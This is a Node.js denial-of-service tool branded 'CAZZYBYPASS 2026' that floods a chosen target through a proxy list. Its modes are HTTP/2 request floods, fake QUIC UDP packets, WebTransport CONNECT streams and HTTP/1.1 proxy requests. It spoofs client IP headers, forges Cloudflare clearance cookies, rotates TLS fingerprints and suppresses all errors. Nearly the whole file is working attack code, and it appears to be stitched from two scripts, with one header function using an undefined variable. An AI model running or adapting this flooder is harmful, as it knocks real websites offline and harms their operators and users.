#!/usr/bin/env node


'use strict';

// ========== MODULES ==========
const cluster = require('cluster');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');
const dgram = require('dgram');
const { execSync } = require('child_process');

// ========== IGNORE ERRORS (TRAUMA PREVENTION) ==========
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; else console.error(e); });
process.on('unhandledRejection', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; else console.error(e); });
process.on('warning', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return; });
process.setMaxListeners(0);

// ========== ARGUMENTS ==========
if (process.argv.length < 8) {
    console.log('Usage: node combined.js <target> <time_sec> <threads> <proxy.txt> <rps> <mode>');
    console.log('Mode: http2 | quic | webtransport | hybrid');
    process.exit(1);
}
const target = process.argv[2];
const timeSec = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const proxyFile = process.argv[5];
const rps = parseInt(process.argv[6]);
const mode = process.argv[7];

// ========== PROXY LOADING ==========
let proxies = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxies = proxyData.match(/\S+/g).filter(line => line.includes(':'));
} catch(err) { console.error('Proxy file error'); process.exit(1); }
const proxyr = () => proxies[Math.floor(Math.random() * proxies.length)];

// ========== UTILITIES ==========
function randstr(len) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let res = '';
    for(let i=0; i<len; i++) res += chars[Math.floor(Math.random() * chars.length)];
    return res;
}
function randstrs(len) {
    const chars = '0123456789';
    let res = '';
    for(let i=0; i<len; i++) res += chars[Math.floor(Math.random() * chars.length)];
    return res;
}
function randomIp() { return `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`; }
function ipv6_spoof() { return Array(8).fill().map(() => Math.floor(Math.random()*65536).toString(16)).join(':'); }
function randomInt(min,max) { return Math.floor(Math.random()*(max-min+1))+min; }

// ========== HEADER DATABASES (MERGED) ==========
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,*/*;q=0.8"
];
const lang_header = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'ja-JP,ja;q=0.9'];
const encoding_header = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip', 'zstd, br, gzip'];
const controle_header = ['no-cache', 'no-store', 'max-age=0', 'must-revalidate'];
const platform = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS'];
const fetch_site = ['same-origin', 'cross-site', 'none'];
const fetch_mode = ['navigate', 'cors', 'no-cors'];
const fetch_dest = ['document', 'worker', 'sharedworker', 'empty'];
const country = ['US', 'GB', 'DE', 'FR', 'JP', 'CN', 'RU', 'BR', 'IN', 'AU'];
const type = ['text/plain', 'text/html', 'application/json', 'application/xml', 'image/jpeg', 'video/mp4'];

// Script1 cipher list (excerpt, full would be huge)
const cplist = [
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384'
];
// Script2 TLS fingerprints
const tls_fingerprints_2026 = [
    { ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384", curves: "X25519Kyber768:P-256", sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256" },
    { ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384", curves: "X25519:P-256", sigalgs: "ecdsa_secp256r1_sha256:rsa_pkcs1_sha256" }
];
const referer = ['https://www.google.com/search?q=', 'https://www.bing.com/search?q=', 'https://duckduckgo.com/?q='];
const uap_2026 = [
    "Mozilla/5.0 (Windows NT 12.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Android 15; Mobile) Gecko/145.0 Firefox/145.0"
];

const headerFunc = {
    accept: () => accept_header[Math.floor(Math.random() * accept_header.length)],
    lang: () => lang_header[Math.floor(Math.random() * lang_header.length)],
    encoding: () => encoding_header[Math.floor(Math.random() * encoding_header.length)],
    controling: () => controle_header[Math.floor(Math.random() * controle_header.length)],
    cipher: () => Math.random() > 0.3 ? cplist[Math.floor(Math.random() * cplist.length)] : tls_fingerprints_2026[Math.floor(Math.random() * tls_fingerprints_2026.length)].ciphers,
    referers: () => referer[Math.floor(Math.random() * referer.length)] + randstr(8),
    platforms: () => platform[Math.floor(Math.random() * platform.length)],
    mode: () => fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
    dest: () => fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
    site: () => fetch_site[Math.floor(Math.random() * fetch_site.length)],
    countrys: () => country[Math.floor(Math.random() * country.length)],
    type: () => type[Math.floor(Math.random() * type.length)]
};

function generateHeaders(fakeIP) {
    const httpTime = new Date().toUTCString();
    return {
        ':authority': parsed.host,
        ':method': 'GET',
        ':path': parsed.path + '?' + randstr(10) + '=' + randstr(10) + '&_=' + Date.now(),
        ':scheme': 'https',
        'Cache-Control': headerFunc.controling(),
        'Accept-Encoding': headerFunc.encoding(),
        'X-Forwarded-For': fakeIP,
        'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150"`,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': headerFunc.platforms(),
        'User-Agent': uap_2026[Math.floor(Math.random() * uap_2026.length)],
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': headerFunc.site(),
        'sec-fetch-dest': headerFunc.dest(),
        'sec-fetch-mode': headerFunc.mode(),
        'accept': headerFunc.accept(),
        'accept-language': headerFunc.lang(),
        'Origin': target,
        'CF-IPCountry': headerFunc.countrys(),
        'Referer': headerFunc.referers(),
        'If-Modified-Since': httpTime,
        'x-requested-with': 'XMLHttpRequest',
        'content-type': headerFunc.type(),
        'Cookie': `cf_clearance=${randstr(43)}-${randstrs(10)}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-${randstrs(3)}.2.${randstrs(10)}`,
        'CF-ConnectingIP': fakeIP,
        'CF-Worker': parsed.host,
        'X-Forwarded-Proto': 'https'
    };
}

// ========== HTTP/2 FLOOD (SCRIPT1 CORE) ==========
function http2Flood(proxyAddr, rpsPerInterval) {
    const [proxyHost, proxyPort] = proxyAddr.split(':');
    const parsed = new URL(target);
    const agent = new http.Agent({ keepAlive: true, maxSockets: 5000 });
    const requestOptions = {
        host: proxyHost,
        port: proxyPort,
        method: 'CONNECT',
        path: `${parsed.host}:443`,
        agent: agent,
        timeout: 5000,
        headers: { 'Host': parsed.host, 'Proxy-Connection': 'Keep-Alive' }
    };
    const req = http.request(requestOptions);
    req.on('connect', (res, socket, head) => {
        const tlsSocket = tls.connect({
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket,
            ciphers: headerFunc.cipher(),
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1']
        });
        const client = http2.connect(parsed.href, { createConnection: () => tlsSocket, settings: { maxConcurrentStreams: 1000 } });
        client.on('connect', () => {
            const interval = setInterval(() => {
                for(let i=0; i<rpsPerInterval; i++) {
                    const fakeIP = randomIp();
                    const headers = generateHeaders(fakeIP);
                    const stream = client.request(headers);
                    stream.on('response', () => { stream.close(); stream.destroy(); });
                    stream.end();
                }
            }, 1000);
            setTimeout(() => { clearInterval(interval); client.destroy(); tlsSocket.destroy(); socket.destroy(); }, 30000);
        });
        client.on('error', () => {});
    });
    req.end();
}

// ========== QUIC UDP FLOOD (REAL UDP PACKETS) ==========
class QUICFlooder {
    constructor(targetHost, targetPort=443) {
        this.targetHost = targetHost;
        this.targetPort = targetPort;
        this.socket = null;
    }
    buildQUICPacket() {
        const packet = Buffer.alloc(1200);
        packet[0] = 0xC0 | (Math.random() * 0x0F); // Long header, Initial
        packet.writeUInt32BE(0x00000001, 1); // Version 1
        const dcid = crypto.randomBytes(8);
        packet[5] = dcid.length;
        dcid.copy(packet, 6);
        const scid = crypto.randomBytes(8);
        packet[6+dcid.length] = scid.length;
        scid.copy(packet, 7+dcid.length);
        packet.writeUInt32BE(0, 7+dcid.length+scid.length); // Token length 0
        crypto.randomFillSync(packet, 11+dcid.length+scid.length);
        return packet;
    }
    start(rps) {
        this.socket = dgram.createSocket('udp4');
        setInterval(() => {
            for(let i=0; i<rps; i++) {
                const pkt = this.buildQUICPacket();
                this.socket.send(pkt, 0, pkt.length, this.targetPort, this.targetHost, (err) => { if(err) { /* ignore */ } });
            }
        }, 1000);
    }
    stop() { if(this.socket) this.socket.close(); }
}

// ========== WEBTRANSPORT SIMULATION (HTTP/2 CONNECT METHOD) ==========
class WebTransportSim {
    constructor(targetUrl) {
        this.target = new URL(targetUrl);
    }
    start(rps, proxyAddr) {
        const [proxyHost, proxyPort] = proxyAddr.split(':');
        setInterval(() => {
            for(let i=0; i<rps; i++) {
                const agent = new http.Agent({ keepAlive: true });
                const opts = {
                    host: proxyHost,
                    port: proxyPort,
                    method: 'CONNECT',
                    path: `${this.target.host}:443`,
                    agent: agent
                };
                const req = http.request(opts);
                req.on('connect', (res, socket) => {
                    const tlsSocket = tls.connect({ host: this.target.host, port: 443, socket: socket, rejectUnauthorized: false, ALPNProtocols: ['h2'] });
                    const client = http2.connect(this.target.href, { createConnection: () => tlsSocket });
                    client.on('connect', () => {
                        const wtHeaders = {
                            ':method': 'CONNECT',
                            ':protocol': 'webtransport',
                            ':path': '/.well-known/webtransport',
                            ':authority': this.target.host,
                            'sec-webtransport-http3-draft': 'draft02',
                            'origin': `https://${this.target.host}`
                        };
                        const stream = client.request(wtHeaders);
                        stream.end();
                        setTimeout(() => { stream.close(); client.destroy(); }, 5000);
                    });
                });
                req.end();
            }
        }, 1000);
    }
}

// ========== CLUSTER MASTER ==========
if (cluster.isMaster) {
    console.log(`
    ╔══════════════════════════════════════════════════╗
    ║   CAZZYBYPASS 2026 - HTTP/2+QUIC+WT             ║
    ║   TARGET: ${target}                               ║
    ║   TIME: ${timeSec}s | THREADS: ${threads} | RPS: ${rps}   ║
    ╚══════════════════════════════════════════════════╝
    `);
    for(let i=0; i<threads; i++) cluster.fork();
    setTimeout(() => { console.log('Time over. Exiting.'); process.exit(0); }, timeSec * 1000);
} else {
    // Worker process
    const parsed = new URL(target);
    const rpsPerWorker = Math.floor(rps / threads);
    const quicRps = Math.floor(rpsPerWorker * 0.5);
    const wtRps = Math.floor(rpsPerWorker * 0.2);
    const http2Rps = rpsPerWorker - quicRps - wtRps;

    if (mode === 'http2' || mode === 'hybrid') {
        setInterval(() => {
            const proxy = proxyr();
            if(proxy) http2Flood(proxy, http2Rps);
        }, 1000);
    }
    if (mode === 'quic' || mode === 'hybrid') {
        const quic = new QUICFlooder(parsed.hostname, 443);
        quic.start(quicRps);
    }
    if (mode === 'webtransport' || mode === 'hybrid') {
        const wt = new WebTransportSim(target);
        setInterval(() => {
            const proxy = proxyr();
            if(proxy) wt.start(wtRps, proxy);
        }, 1000);
    }
    if (mode === 'hybrid') {
        // Also add a simple HTTP/1.1 amplification via proxy
        setInterval(() => {
            const proxy = proxyr();
            if(proxy) {
                const [ph, pp] = proxy.split(':');
                const req = http.request({ host: ph, port: pp, method: 'GET', path: `http://${parsed.host}/` });
                req.end();
            }
        }, 100);
    }
}
